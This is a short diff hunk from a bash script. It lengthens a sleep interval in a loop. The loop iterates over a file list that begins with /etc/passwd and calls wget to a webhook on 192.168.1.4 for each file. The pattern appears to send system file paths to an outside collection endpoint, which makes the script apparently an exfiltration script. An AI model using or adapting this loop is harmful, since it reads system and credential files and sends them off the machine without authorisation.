@@ -96,5 +96,5 @@ declare -a files=("/etc/passwd"
 for file in "${files[@]}"
 do
 	wget http://192.168.1.4/webhook.php/file="$file"
-	sleep 15
+	sleep 20
 done
